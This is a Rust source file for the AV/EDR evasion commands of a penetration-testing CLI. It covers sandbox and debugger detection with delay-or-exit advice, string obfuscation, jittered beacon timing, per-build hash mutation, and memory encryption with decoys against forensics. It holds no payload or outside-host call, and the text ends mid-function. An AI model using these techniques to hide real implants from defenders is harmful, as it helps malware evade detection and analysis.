//! Evasion CLI commands
//!
//! AV/EDR evasion techniques for authorized penetration testing.
//!
//! # Usage
//! ```bash
//! rb evasion sandbox check           # Check if running in sandbox/VM
//! rb evasion sandbox score           # Get sandbox detection score
//! rb evasion obfuscate xor <string>  # XOR obfuscate a string
//! rb evasion obfuscate base64 <data> # Base64 encode data
//! rb evasion network jitter <ms>     # Calculate jittered delay
//! ```

use crate::cli::output::Output;
use crate::cli::CliContext;
use crate::modules::evasion::{
    amsi, antidebug, api_hash, control_flow, inject, memory, mutations, network, obfuscate,
    sandbox, strings, tracks, EvasionConfig,
};

use super::{Command, Flag, Route};

// ANSI color codes
const RED: &str = "\x1b[31m";
const GREEN: &str = "\x1b[32m";
const YELLOW: &str = "\x1b[33m";
const RESET: &str = "\x1b[0m";

fn colored(text: &str, color: &str) -> String {
    format!("{}{}{}", color, text, RESET)
}

// =============================================================================
// Sandbox Command
// =============================================================================

pub struct EvasionSandboxCommand;

impl Command for EvasionSandboxCommand {
    fn domain(&self) -> &str {
        "evasion"
    }

    fn resource(&self) -> &str {
        "sandbox"
    }

    fn description(&self) -> &str {
        "Sandbox and VM detection techniques"
    }

    fn routes(&self) -> Vec<Route> {
        vec![
            Route {
                verb: "check",
                summary: "Check if running in sandbox/VM",
                usage: "rb evasion sandbox check",
            },
            Route {
                verb: "score",
                summary: "Get detailed sandbox detection score (0-100)",
                usage: "rb evasion sandbox score",
            },
            Route {
                verb: "delay",
                summary: "Delay execution if sandbox detected",
                usage: "rb evasion sandbox delay <ms>",
            },
        ]
    }

    fn flags(&self) -> Vec<Flag> {
        vec![]
    }

    fn examples(&self) -> Vec<(&str, &str)> {
        vec![
            ("Check if in sandbox", "rb evasion sandbox check"),
            ("Get sandbox score", "rb evasion sandbox score"),
            (
                "Delay 5 minutes if sandbox",
                "rb evasion sandbox delay 300000",
            ),
        ]
    }

    fn execute(&self, ctx: &CliContext) -> Result<(), String> {
        let verb = ctx.verb.as_deref().unwrap_or("check");

        match verb {
            "check" => execute_sandbox_check(),
            "score" => execute_sandbox_score(),
            "delay" => execute_sandbox_delay(ctx),
            _ => Err(format!("Unknown verb: {}", verb)),
        }
    }
}

fn execute_sandbox_check() -> Result<(), String> {
    Output::header("Sandbox Detection");
    println!();

    Output::spinner_start("Running sandbox checks");

    let is_sandbox = sandbox::detect_sandbox();

    Output::spinner_done();
    println!();

    if is_sandbox {
        Output::error("Sandbox/VM environment DETECTED");
        println!();
        Output::warning("The environment shows signs of analysis environment");
    } else {
        Output::success("No sandbox/VM detected");
        println!();
        Output::info("Environment appears to be a real system");
    }

    // Show individual check results
    println!();
    Output::info("Individual Checks:");

    let checks = [
        ("VM Files", sandbox::check_vm_files()),
        ("Sandbox Processes", sandbox::check_sandbox_processes()),
        ("Timing Anomaly", sandbox::check_timing_anomaly()),
        ("Low Resources", sandbox::check_low_resources()),
        ("Suspicious Username", sandbox::check_suspicious_username()),
        ("Debugger Present", sandbox::check_debugger()),
    ];

    for (name, detected) in &checks {
        if *detected {
            println!("    {} {}", colored("[DETECTED]", RED), name);
        } else {
            println!("    {} {}", colored("[CLEAN]", GREEN), name);
        }
    }

    Ok(())
}

fn execute_sandbox_score() -> Result<(), String> {
    Output::header("Sandbox Detection Score");
    println!();

    Output::spinner_start("Calculating score");

    let score = sandbox::sandbox_score();

    Output::spinner_done();
    println!();

    // Display score with color based on value
    let score_color = if score >= 50 {
        colored(&format!("{}/100", score), RED)
    } else if score >= 25 {
        colored(&format!("{}/100", score), YELLOW)
    } else {
        colored(&format!("{}/100", score), GREEN)
    };

    println!("    Sandbox Score: {}", score_color);
    println!();

    // Interpretation
    if score >= 50 {
        Output::error("HIGH RISK - Likely sandbox/VM environment");
        Output::info("Recommendation: Delay execution or exit");
    } else if score >= 25 {
        Output::warning("MEDIUM RISK - Some sandbox indicators present");
        Output::info("Recommendation: Proceed with caution");
    } else {
        Output::success("LOW RISK - Appears to be real environment");
        Output::info("Recommendation: Safe to proceed");
    }

    // Show breakdown
    println!();
    Output::info("Score Breakdown:");
    println!(
        "    VM Files:           {} pts",
        if sandbox::check_vm_files() {
            "+20"
        } else {
            "  0"
        }
    );
    println!(
        "    Sandbox Processes:  {} pts",
        if sandbox::check_sandbox_processes() {
            "+20"
        } else {
            "  0"
        }
    );
    println!(
        "    Timing Anomaly:     {} pts",
        if sandbox::check_timing_anomaly() {
            "+25"
        } else {
            "  0"
        }
    );
    println!(
        "    Low Resources:      {} pts",
        if sandbox::check_low_resources() {
            "+15"
        } else {
            "  0"
        }
    );
    println!(
        "    Suspicious User:    {} pts",
        if sandbox::check_suspicious_username() {
            "+10"
        } else {
            "  0"
        }
    );
    println!(
        "    Debugger Present:   {} pts",
        if sandbox::check_debugger() {
            "+10"
        } else {
            "  0"
        }
    );

    Ok(())
}

fn execute_sandbox_delay(ctx: &CliContext) -> Result<(), String> {
    let delay_ms: u64 = ctx
        .target
        .as_ref()
        .and_then(|s| s.parse().ok())
        .unwrap_or(300_000);

    Output::header("Sandbox-Aware Delay");
    println!();

    let is_sandbox = sandbox::detect_sandbox();

    if is_sandbox {
        Output::warning(&format!(
            "Sandbox detected - delaying {} ms ({} seconds)",
            delay_ms,
            delay_ms / 1000
        ));
        sandbox::delay_execution(delay_ms);
        Output::success("Delay complete");
    } else {
        Output::info("No sandbox detected - no delay needed");
    }

    Ok(())
}

// =============================================================================
// Obfuscate Command
// =============================================================================

pub struct EvasionObfuscateCommand;

impl Command for EvasionObfuscateCommand {
    fn domain(&self) -> &str {
        "evasion"
    }

    fn resource(&self) -> &str {
        "obfuscate"
    }

    fn description(&self) -> &str {
        "String and data obfuscation techniques"
    }

    fn routes(&self) -> Vec<Route> {
        vec![
            Route {
                verb: "xor",
                summary: "XOR obfuscate a string",
                usage: "rb evasion obfuscate xor <string> [--key <n>]",
            },
            Route {
                verb: "base64",
                summary: "Base64 encode data",
                usage: "rb evasion obfuscate base64 <data>",
            },
            Route {
                verb: "rot",
                summary: "ROT-N encode string (Caesar cipher)",
                usage: "rb evasion obfuscate rot <string> [--shift <n>]",
            },
            Route {
                verb: "deobfuscate",
                summary: "Deobfuscate XOR data",
                usage: "rb evasion obfuscate deobfuscate <hex> --key <n>",
            },
        ]
    }

    fn flags(&self) -> Vec<Flag> {
        vec![
            Flag::new("key", "XOR key (0-255)")
                .with_short('k')
                .with_arg("N"),
            Flag::new("shift", "ROT shift amount (1-25)")
                .with_short('s')
                .with_default("13"),
            Flag::new("hex", "Output as hex string"),
        ]
    }

    fn examples(&self) -> Vec<(&str, &str)> {
        vec![
            (
                "XOR obfuscate",
                "rb evasion obfuscate xor \"secret command\"",
            ),
            (
                "XOR with custom key",
                "rb evasion obfuscate xor \"secret\" --key 66 --hex",
            ),
            (
                "Base64 encode",
                "rb evasion obfuscate base64 \"sensitive data\"",
            ),
            ("ROT13 encode", "rb evasion obfuscate rot \"hello world\""),
            (
                "Deobfuscate",
                "rb evasion obfuscate deobfuscate 31262d2521 --key 66",
            ),
        ]
    }

    fn execute(&self, ctx: &CliContext) -> Result<(), String> {
        let verb = ctx.verb.as_deref().unwrap_or("xor");

        match verb {
            "xor" => execute_obfuscate_xor(ctx),
            "base64" => execute_obfuscate_base64(ctx),
            "rot" => execute_obfuscate_rot(ctx),
            "deobfuscate" => execute_deobfuscate(ctx),
            _ => Err(format!("Unknown verb: {}", verb)),
        }
    }
}

fn execute_obfuscate_xor(ctx: &CliContext) -> Result<(), String> {
    let data = ctx.target.as_ref().ok_or("Missing string to obfuscate")?;

    let key: u8 = ctx
        .flags
        .get("key")
        .and_then(|s| s.parse().ok())
        .unwrap_or_else(|| {
            // Auto-derive key from content
            let mut k: u8 = 0x5A;
            for b in data.bytes() {
                k = k.wrapping_add(b).rotate_left(3);
            }
            if k == 0 {
                0x42
            } else {
                k
            }
        });

    let show_hex = ctx.flags.contains_key("hex");

    Output::header("XOR Obfuscation");
    println!();

    let obfuscated = obfuscate::xor_obfuscate(data, key);

    Output::item("Original", data);
    Output::item("Key", &format!("0x{:02X} ({})", key, key));

    if show_hex {
        let hex: String = obfuscated.iter().map(|b| format!("{:02x}", b)).collect();
        Output::item("Obfuscated (hex)", &hex);
    } else {
        Output::item("Obfuscated (bytes)", &format!("{:?}", obfuscated));
    }

    // Show deobfuscation command
    let hex: String = obfuscated.iter().map(|b| format!("{:02x}", b)).collect();
    println!();
    Output::info("To deobfuscate:");
    println!("    rb evasion obfuscate deobfuscate {} --key {}", hex, key);

    Ok(())
}

fn execute_obfuscate_base64(ctx: &CliContext) -> Result<(), String> {
    let data = ctx.target.as_ref().ok_or("Missing data to encode")?;

    Output::header("Base64 Encoding");
    println!();

    let encoded = obfuscate::base64_encode(data.as_bytes());

    Output::item("Original", data);
    Output::item("Encoded", &encoded);

    Ok(())
}

fn execute_obfuscate_rot(ctx: &CliContext) -> Result<(), String> {
    let data = ctx.target.as_ref().ok_or("Missing string to encode")?;

    let shift: u8 = ctx
        .flags
        .get("shift")
        .and_then(|s| s.parse().ok())
        .unwrap_or(13);

    Output::header(&format!("ROT-{} Encoding", shift));
    println!();

    let encoded = obfuscate::rot_encode(data, shift);

    Output::item("Original", data);
    Output::item("Shift", &shift.to_string());
    Output::item("Encoded", &encoded);

    // Show decode command
    println!();
    Output::info("To decode:");
    println!(
        "    rb evasion obfuscate rot \"{}\" --shift {}",
        encoded,
        26 - (shift % 26)
    );

    Ok(())
}

fn execute_deobfuscate(ctx: &CliContext) -> Result<(), String> {
    let hex_data = ctx
        .target
        .as_ref()
        .ok_or("Missing hex data to deobfuscate")?;
    let key: u8 = ctx
        .flags
        .get("key")
        .and_then(|s| s.parse().ok())
        .ok_or("Missing --key flag")?;

    Output::header("XOR Deobfuscation");
    println!();

    // Parse hex string to bytes
    let bytes: Result<Vec<u8>, _> = (0..hex_data.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&hex_data[i..i + 2], 16))
        .collect();

    let bytes = bytes.map_err(|_| "Invalid hex string")?;

    let deobfuscated = obfuscate::xor_deobfuscate(&bytes, key);

    Output::item("Hex Input", hex_data);
    Output::item("Key", &format!("0x{:02X} ({})", key, key));
    Output::item("Deobfuscated", &deobfuscated);

    Ok(())
}

// =============================================================================
// Network Command
// =============================================================================

pub struct EvasionNetworkCommand;

impl Command for EvasionNetworkCommand {
    fn domain(&self) -> &str {
        "evasion"
    }

    fn resource(&self) -> &str {
        "network"
    }

    fn description(&self) -> &str {
        "Network evasion techniques (jitter, timing)"
    }

    fn routes(&self) -> Vec<Route> {
        vec![
            Route {
                verb: "jitter",
                summary: "Calculate jittered delay",
                usage: "rb evasion network jitter <base_ms> [--percent <n>]",
            },
            Route {
                verb: "timer",
                summary: "Show beacon timer example",
                usage: "rb evasion network timer <interval_ms>",
            },
            Route {
                verb: "shape",
                summary: "Show traffic shaping config",
                usage: "rb evasion network shape",
            },
        ]
    }

    fn flags(&self) -> Vec<Flag> {
        vec![
            Flag::new("percent", "Jitter percentage (0-100)")
                .with_short('p')
                .with_default("30"),
            Flag::new("count", "Number of samples to show")
                .with_short('c')
                .with_default("5"),
        ]
    }

    fn examples(&self) -> Vec<(&str, &str)> {
        vec![
            (
                "Calculate jittered delay",
                "rb evasion network jitter 60000 --percent 30",
            ),
            ("Show beacon timer", "rb evasion network timer 60000"),
            ("Show traffic shaper", "rb evasion network shape"),
        ]
    }

    fn execute(&self, ctx: &CliContext) -> Result<(), String> {
        let verb = ctx.verb.as_deref().unwrap_or("jitter");

        match verb {
            "jitter" => execute_network_jitter(ctx),
            "timer" => execute_network_timer(ctx),
            "shape" => execute_network_shape(),
            _ => Err(format!("Unknown verb: {}", verb)),
        }
    }
}

fn execute_network_jitter(ctx: &CliContext) -> Result<(), String> {
    let base_ms: u64 = ctx
        .target
        .as_ref()
        .and_then(|s| s.parse().ok())
        .ok_or("Missing base delay in milliseconds")?;

    let jitter_percent: u8 = ctx
        .flags
        .get("percent")
        .and_then(|s| s.parse().ok())
        .unwrap_or(30);

    let count: usize = ctx
        .flags
        .get("count")
        .and_then(|s| s.parse().ok())
        .unwrap_or(5);

    Output::header("Jittered Delay Calculator");
    println!();

    Output::item("Base Delay", &format!("{} ms", base_ms));
    Output::item("Jitter", &format!("{}%", jitter_percent));

    let min = base_ms.saturating_sub((base_ms * jitter_percent as u64) / 100);
    let max = base_ms + (base_ms * jitter_percent as u64) / 100;
    Output::item("Range", &format!("{} - {} ms", min, max));

    println!();
    Output::info(&format!("Sample delays ({} iterations):", count));

    for i in 1..=count {
        let delay = network::jittered_duration(base_ms, jitter_percent);
        println!("    #{}: {} ms", i, delay.as_millis());
        // Small sleep to get different random values
        std::thread::sleep(std::time::Duration::from_millis(1));
    }

    Ok(())
}

fn execute_network_timer(ctx: &CliContext) -> Result<(), String> {
    let interval_ms: u64 = ctx
        .target
        .as_ref()
        .and_then(|s| s.parse().ok())
        .unwrap_or(60_000);

    let jitter_percent: u8 = ctx
        .flags
        .get("percent")
        .and_then(|s| s.parse().ok())
        .unwrap_or(30);

    Output::header("Beacon Timer Example");
    println!();

    Output::item(
        "Interval",
        &format!("{} ms ({} seconds)", interval_ms, interval_ms / 1000),
    );
    Output::item("Jitter", &format!("{}%", jitter_percent));

    let mut timer = network::BeaconTimer::new(interval_ms, jitter_percent);

    println!();
    Output::info("Next 5 beacon delays:");

    for i in 1..=5 {
        let delay = timer.next_delay();
        println!(
            "    Beacon #{}: {} ms ({:.1} seconds)",
            i,
            delay.as_millis(),
            delay.as_secs_f64()
        );
    }

    println!();
    Output::info("Usage in code:");
    println!(
        "    let mut timer = BeaconTimer::new({}, {});",
        interval_ms, jitter_percent
    );
    println!("    loop {{");
    println!("        timer.wait();  // Jittered sleep");
    println!("        beacon_home(); // Your callback");
    println!("    }}");

    Ok(())
}

fn execute_network_shape() -> Result<(), String> {
    Output::header("Traffic Shaper Configuration");
    println!();

    let shaper = network::TrafficShaper::default();

    Output::info("Default Configuration:");
    println!("    Min Delay:      500 ms");
    println!("    Max Delay:      3000 ms");
    println!("    Pause Chance:   10%");
    println!("    Pause Duration: 15000 ms");

    println!();
    Output::info("Sample delays (10 iterations):");

    for i in 1..=10 {
        let delay = shaper.next_delay();
        let pause_indicator = if delay.as_millis() > 10000 {
            " (PAUSE)"
        } else {
            ""
        };
        println!("    #{}: {} ms{}", i, delay.as_millis(), pause_indicator);
        std::thread::sleep(std::time::Duration::from_millis(1));
    }

    println!();
    Output::info("Usage in code:");
    println!("    let shaper = TrafficShaper::new(500, 3000);");
    println!("    for target in targets {{");
    println!("        shaper.delay();  // Human-like pause");
    println!("        scan_target(target);");
    println!("    }}");

    Ok(())
}

// =============================================================================
// Config Command
// =============================================================================

pub struct EvasionConfigCommand;

impl Command for EvasionConfigCommand {
    fn domain(&self) -> &str {
        "evasion"
    }

    fn resource(&self) -> &str {
        "config"
    }

    fn description(&self) -> &str {
        "Evasion configuration presets"
    }

    fn routes(&self) -> Vec<Route> {
        vec![
            Route {
                verb: "show",
                summary: "Show evasion configuration presets",
                usage: "rb evasion config show",
            },
            Route {
                verb: "default",
                summary: "Show default configuration",
                usage: "rb evasion config default",
            },
            Route {
                verb: "stealth",
                summary: "Show stealth configuration",
                usage: "rb evasion config stealth",
            },
            Route {
                verb: "aggressive",
                summary: "Show aggressive configuration",
                usage: "rb evasion config aggressive",
            },
        ]
    }

    fn flags(&self) -> Vec<Flag> {
        vec![]
    }

    fn examples(&self) -> Vec<(&str, &str)> {
        vec![
            ("Show all presets", "rb evasion config show"),
            ("Show stealth config", "rb evasion config stealth"),
        ]
    }

    fn execute(&self, ctx: &CliContext) -> Result<(), String> {
        let verb = ctx.verb.as_deref().unwrap_or("show");

        match verb {
            "show" => execute_config_show(),
            "default" => execute_config_preset("default"),
            "stealth" => execute_config_preset("stealth"),
            "aggressive" => execute_config_preset("aggressive"),
            _ => execute_config_show(),
        }
    }
}

fn execute_config_show() -> Result<(), String> {
    Output::header("Evasion Configuration Presets");
    println!();

    Output::info("Default Configuration:");
    let default = EvasionConfig::default();
    print_config(&default);

    println!();
    Output::info("Stealth Configuration:");
    let stealth = EvasionConfig::stealth();
    print_config(&stealth);

    println!();
    Output::info("Aggressive Configuration:");
    let aggressive = EvasionConfig::aggressive();
    print_config(&aggressive);

    Ok(())
}

fn execute_config_preset(preset: &str) -> Result<(), String> {
    let config = match preset {
        "default" => EvasionConfig::default(),
        "stealth" => EvasionConfig::stealth(),
        "aggressive" => EvasionConfig::aggressive(),
        _ => EvasionConfig::default(),
    };

    Output::header(&format!("{} Configuration", preset.to_uppercase()));
    println!();
    print_config(&config);

    Ok(())
}

fn print_config(config: &EvasionConfig) {
    println!("    Obfuscate Strings: {}", config.obfuscate_strings);
    println!("    Detect Sandbox:    {}", config.detect_sandbox);
    println!("    Sandbox Delay:     {} ms", config.sandbox_delay_ms);
    println!("    Sandbox Exit:      {}", config.sandbox_exit);
    println!("    Network Jitter:    {}", config.network_jitter);
    println!("    Beacon Interval:   {} ms", config.beacon_interval_ms);
    println!("    Jitter Percent:    {}%", config.jitter_percent);
}

// =============================================================================
// Build Command - Shows build-time mutation info
// =============================================================================

pub struct EvasionBuildCommand;

impl Command for EvasionBuildCommand {
    fn domain(&self) -> &str {
        "evasion"
    }

    fn resource(&self) -> &str {
        "build"
    }

    fn description(&self) -> &str {
        "Build-time binary mutation information"
    }

    fn routes(&self) -> Vec<Route> {
        vec![
            Route {
                verb: "info",
                summary: "Show build mutation fingerprint and keys",
                usage: "rb evasion build info",
            },
            Route {
                verb: "obfuscate",
                summary: "Obfuscate string using build-specific key",
                usage: "rb evasion build obfuscate <string>",
            },
            Route {
                verb: "deobfuscate",
                summary: "Deobfuscate hex data using build-specific key",
                usage: "rb evasion build deobfuscate <hex>",
            },
        ]
    }

    fn flags(&self) -> Vec<Flag> {
        vec![Flag::new("hex", "Output as hex string")]
    }

    fn examples(&self) -> Vec<(&str, &str)> {
        vec![
            ("Show build info", "rb evasion build info"),
            (
                "Build-key obfuscate",
                "rb evasion build obfuscate \"secret\"",
            ),
            (
                "Build-key deobfuscate",
                "rb evasion build deobfuscate a1b2c3",
            ),
        ]
    }

    fn execute(&self, ctx: &CliContext) -> Result<(), String> {
        let verb = ctx.verb.as_deref().unwrap_or("info");

        match verb {
            "info" => execute_build_info(),
            "obfuscate" => execute_build_obfuscate(ctx),
            "deobfuscate" => execute_build_deobfuscate(ctx),
            _ => Err(format!("Unknown verb: {}", verb)),
        }
    }
}

fn execute_build_info() -> Result<(), String> {
    Output::header("Build-Time Mutation Info");
    println!();

    Output::info("This binary was compiled with unique mutation values.");
    Output::info("Each `cargo build` produces a different binary hash.");
    println!();

    // Show build fingerprint
    let fingerprint = mutations::get_build_fingerprint();
    Output::item("Build Fingerprint", fingerprint);

    // Show build timestamp
    let timestamp = mutations::get_build_timestamp();
    let datetime = format_timestamp(timestamp);
    Output::item("Build Timestamp", &format!("{} ({})", timestamp, datetime));

    // Show XOR key
    let xor_key = mutations::get_xor_key();
    Output::item("XOR Key", &format!("0x{:02X} ({})", xor_key, xor_key));

    println!();
    Output::info("How it works:");
    println!("    1. build.rs runs before each compilation");
    println!("    2. Generates random values using timestamp + entropy");
    println!("    3. Values are embedded in binary at compile time");
    println!("    4. Result: Different SHA256 hash each build");

    println!();
    Output::info("To verify hash changes:");
    println!("    touch build.rs && cargo build --release");
    println!("    sha256sum target/release/redblue");
    println!("    touch build.rs && cargo build --release");
    println!("    sha256sum target/release/redblue");

    Ok(())
}

fn execute_build_obfuscate(ctx: &CliContext) -> Result<(), String> {
    let data = ctx.target.as_ref().ok_or("Missing string to obfuscate")?;
    let show_hex = ctx.flags.contains_key("hex");

    Output::header("Build-Key Obfuscation");
    println!();

    let obfuscated = mutations::obfuscate_string(data);

    Output::item("Original", data);
    Output::item(
        "Build XOR Key",
        &format!("0x{:02X}", mutations::get_xor_key()),
    );

    if show_hex {
        let hex: String = obfuscated.iter().map(|b| format!("{:02x}", b)).collect();
        Output::item("Obfuscated (hex)", &hex);
    } else {
        Output::item("Obfuscated (bytes)", &format!("{:?}", obfuscated));
    }

    // Show deobfuscation command
    let hex: String = obfuscated.iter().map(|b| format!("{:02x}", b)).collect();
    println!();
    Output::info("To deobfuscate with THIS build:");
    println!("    rb evasion build deobfuscate {}", hex);
    println!();
    Output::warning("Note: Only this exact binary can deobfuscate!");
    Output::warning("A rebuild will generate new keys.");

    Ok(())
}

fn execute_build_deobfuscate(ctx: &CliContext) -> Result<(), String> {
    let hex_data = ctx
        .target
        .as_ref()
        .ok_or("Missing hex data to deobfuscate")?;

    Output::header("Build-Key Deobfuscation");
    println!();

    // Parse hex string to bytes
    if hex_data.len() % 2 != 0 {
        return Err("Hex string must have even length".to_string());
    }

    let mut bytes = Vec::with_capacity(hex_data.len() / 2);
    for i in (0..hex_data.len()).step_by(2) {
        let byte = u8::from_str_radix(&hex_data[i..i + 2], 16)
            .map_err(|_| format!("Invalid hex at position {}", i))?;
        bytes.push(byte);
    }

    let deobfuscated = mutations::deobfuscate_string(&bytes);

    Output::item("Hex Input", hex_data);
    Output::item(
        "Build XOR Key",
        &format!("0x{:02X}", mutations::get_xor_key()),
    );
    Output::item("Deobfuscated", &deobfuscated);

    Ok(())
}

/// Format Unix timestamp to human-readable string
fn format_timestamp(unix_secs: u64) -> String {
    // Simple formatting - Unix epoch + seconds
    let secs_per_minute = 60;
    let secs_per_hour = 3600;
    let secs_per_day = 86400;
    let days_per_year = 365;

    let days_since_epoch = unix_secs / secs_per_day;
    let years_since_1970 = days_since_epoch / days_per_year;
    let year = 1970 + years_since_1970;

    let remaining_secs = unix_secs % secs_per_day;
    let hours = remaining_secs / secs_per_hour;
    let minutes = (remaining_secs % secs_per_hour) / secs_per_minute;
    let seconds = remaining_secs % secs_per_minute;

    format!("~{} {:02}:{:02}:{:02} UTC", year, hours, minutes, seconds)
}

// =============================================================================
// Anti-Debug Command
// =============================================================================

pub struct EvasionAntidebugCommand;

impl Command for EvasionAntidebugCommand {
    fn domain(&self) -> &str {
        "evasion"
    }

    fn resource(&self) -> &str {
        "antidebug"
    }

    fn description(&self) -> &str {
        "Anti-debugging detection and evasion techniques"
    }

    fn routes(&self) -> Vec<Route> {
        vec![
            Route {
                verb: "check",
                summary: "Run all anti-debugging checks",
                usage: "rb evasion antidebug check",
            },
            Route {
                verb: "quick",
                summary: "Quick debugger detection (boolean)",
                usage: "rb evasion antidebug quick",
            },
            Route {
                verb: "paranoid",
                summary: "Maximum sensitivity detection",
                usage: "rb evasion antidebug paranoid",
            },
        ]
    }

    fn flags(&self) -> Vec<Flag> {
        vec![
            Flag::new("sensitivity", "Detection sensitivity (0-100)")
                .with_short('s')
                .with_default("50"),
            Flag::new("aggressive", "Use aggressive response techniques"),
        ]
    }

    fn examples(&self) -> Vec<(&str, &str)> {
        vec![
            ("Run all checks", "rb evasion antidebug check"),
            ("Quick check", "rb evasion antidebug quick"),
            ("Paranoid mode", "rb evasion antidebug paranoid"),
            (
                "Custom sensitivity",
                "rb evasion antidebug check --sensitivity 80",
            ),
        ]
    }

    fn execute(&self, ctx: &CliContext) -> Result<(), String> {
        let verb = ctx.verb.as_deref().unwrap_or("check");

        match verb {
            "check" => execute_antidebug_check(ctx),
            "quick" => execute_antidebug_quick(),
            "paranoid" => execute_antidebug_paranoid(),
            _ => Err(format!("Unknown verb: {}", verb)),
        }
    }
}

fn execute_antidebug_check(ctx: &CliContext) -> Result<(), String> {
    let sensitivity: u32 = ctx
        .flags
        .get("sensitivity")
        .and_then(|s| s.parse().ok())
        .unwrap_or(50);
    let aggressive = ctx.flags.contains_key("aggressive");

    Output::header("Anti-Debugging Checks");
    println!();

    Output::spinner_start("Running detection checks");

    let ad = antidebug::AntiDebug::new(sensitivity, aggressive);
    let result = ad.check_all();

    Output::spinner_done();
    println!();

    // Show overall result
    if result.debugger_detected {
        Output::error(&format!("Debugger DETECTED (score: {}/100)", result.score));
    } else {
        Output::success(&format!(
            "No debugger detected (score: {}/100)",
            result.score
        ));
    }

    println!();
    Output::info("Individual Checks:");

    for (name, detected) in &result.checks {
        if *detected {
            println!("    {} {}", colored("[DETECTED]", RED), name);
        } else {
            println!("    {} {}", colored("[CLEAN]", GREEN), name);
        }
    }

    println!();
    Output::info(&format!("Recommended Action: {:?}", result.action));

    Ok(())
}

fn execute_antidebug_quick() -> Result<(), String> {
    Output::header("Quick Debugger Check");
    println!();

    let detected = antidebug::quick_check();

    if detected {
        Output::error("Debugger DETECTED");
        println!();
        Output::warning("Execution may be monitored");
    } else {
        Output::success("No debugger detected");
    }

    Ok(())
}

fn execute_antidebug_paranoid() -> Result<(), String> {
    Output::header("Paranoid Debugger Check");
    println!();

    Output::spinner_start("Running paranoid checks (max sensitivity)");

    let result = antidebug::paranoid_check();

    Output::spinner_done();
    println!();

    if result.debugger_detected {
        Output::error(&format!(
            "Debugger LIKELY PRESENT (score: {}/100)",
            result.score
        ));
        println!();
        for (name, detected) in &result.checks {
            if *detected {
                println!("    {} {}", colored("[!]", RED), name);
            }
        }
    } else {
        Output::success("Environment appears clean");
    }

    Ok(())
}

// =============================================================================
// Memory Command
// =============================================================================

pub struct EvasionMemoryCommand;

impl Command for EvasionMemoryCommand {
    fn domain(&self) -> &str {
        "evasion"
    }

    fn resource(&self) -> &str {
        "memory"
    }

    fn description(&self) -> &str {
        "Memory encryption and protection techniques"
    }

    fn routes(&self) -> Vec<Route> {
        vec![
            Route {
                verb: "encrypt",
                summary: "Encrypt a string in memory",
                usage: "rb evasion memory encrypt <string>",
            },
            Route {
                verb: "demo",
                summary: "Demo secure buffer operations",
                usage: "rb evasion memory demo",
            },
            Route {
                verb: "rotate",
                summary: "Rotate memory encryption key",
                usage: "rb evasion memory rotate",
            },
            Route {
                verb: "vault",
                summary: "Demo SecureVault for protected variable storage",
                usage: "rb evasion memory vault",
            },
        ]
    }

    fn flags(&self) -> Vec<Flag> {
        vec![]
    }

    fn examples(&self) -> Vec<(&str, &str)> {
        vec![
            (
                "Encrypt string",
                "rb evasion memory encrypt \"password123\"",
            ),
            ("Demo operations", "rb evasion memory demo"),
            ("Rotate key", "rb evasion memory rotate"),
        ]
    }

    fn execute(&self, ctx: &CliContext) -> Result<(), String> {
        let verb = ctx.verb.as_deref().unwrap_or("demo");

        match verb {
            "encrypt" => execute_memory_encrypt(ctx),
            "demo" => execute_memory_demo(),
            "rotate" => execute_memory_rotate(),
            "vault" => execute_memory_vault(),
            _ => Err(format!("Unknown verb: {}", verb)),
        }
    }
}

fn execute_memory_encrypt(ctx: &CliContext) -> Result<(), String> {
    let data = ctx.target.as_ref().ok_or("Missing string to encrypt")?;

    Output::header("Memory Encryption");
    println!();

    let buf = memory::SecureBuffer::from_data(data.as_bytes());

    Output::item("Original", data);
    Output::item("Size", &format!("{} bytes", buf.len()));
    Output::item(
        "Integrity",
        if buf.verify_integrity() {
            "OK"
        } else {
            "CORRUPT"
        },
    );

    let encrypted_hex: String = buf
        .encrypted_data()
        .iter()
        .map(|b| format!("{:02x}", b))
        .collect();
    Output::item("Encrypted (hex)", &encrypted_hex);

    // Demonstrate roundtrip
    let recovered = buf.read_string();
    Output::item("Recovered", &recovered);

    println!();
    Output::info("Memory is encrypted in-place using XOR with rolling key");
    Output::info("Data is zeroed on drop (SecureBuffer::drop)");

    Ok(())
}

fn execute_memory_demo() -> Result<(), String> {
    Output::header("Secure Memory Demo");
    println!();

    // Demo SecureString
    Output::info("1. SecureString:");
    let secure_str = memory::SecureString::new("my_secret_password");
    println!("    Stored: [encrypted in memory]");
    println!("    Length: {} bytes", secure_str.len());
    println!("    Valid: {}", secure_str.is_valid());
    println!("    Recovered: {}", secure_str.get());

    println!();

    // Demo SecureCredential
    Output::info("2. SecureCredential:");
    let cred = memory::SecureCredential::new("admin", "super_secret_123");
    println!("    Username: {}", cred.username());
    println!("    Password: {}", cred.password());
    println!(
        "    Integrity: {}",
        if cred.verify() { "OK" } else { "CORRUPT" }
    );

    println!();

    // Demo MemoryGuard
    Output::info("3. MemoryGuard (overflow detection):");
    let mut guard = memory::MemoryGuard::new(100);
    guard.data_mut()[0] = 0x41;
    println!("    Size: 100 bytes");
    println!("    Guards intact: {}", guard.check_guards());
    println!("    First byte: 0x{:02X}", guard.data()[0]);

    println!();
    Output::success("All memory structures zeroed on drop");

    Ok(())
}

fn execute_memory_rotate() -> Result<(), String> {
    Output::header("Key Rotation");
    println!();

    Output::info("Rotating memory encryption key...");
    memory::rotate_key();
    Output::success("Key rotated");
    println!();
    Output::info("New buffers will use the new key");
    Output::warning("Existing buffers retain their original key");

    Ok(())
}

fn execute_memory_vault() -> Result<(), String> {
    Output::header("SecureVault Demo");
    println!();

    Output::info("SecureVault provides multi-layer protection for sensitive variables:");
    println!("    1. XOR encryption with rotating keys");
    println!("    2. Memory locking (prevents swap to disk)");
    println!("    3. Integrity canaries (detect tampering)");
    println!("    4. Decoy entries (confuse memory forensics)");
    println!("    5. Automatic zeroing on drop");
    println!("    6. Access-time-limited decryption");
    println!();

    // Create vault
    Output::info("Creating SecureVault...");
    let mut vault = memory::SecureVault::new();
    println!("    Vault created with {} decoy entries", 6);
    println!();

    // Store secrets
    Output::info("Storing secrets:");
    vault.store("API_KEY", "sk_live_xyz123456789");
    vault.store("DB_PASSWORD", "super_secret_db_pass!");
    vault.store("JWT_SECRET", "my_jwt_signing_key_here");

    println!("    Stored: API_KEY");
    println!("    Stored: DB_PASSWORD");
    println!("    Stored: JWT_SECRET");
    println!("    Total entries: {}", vault.len());
    println!();

    // Retrieve secrets
    Output::info("Retrieving secrets (temporary decryption):");
    if let Some(api_key) = vault.get("API_KEY") {
        // Note: Display shows [REDACTED], we use as_str() to show it works
        println!("    API_KEY value: {}", api_key.as_str());
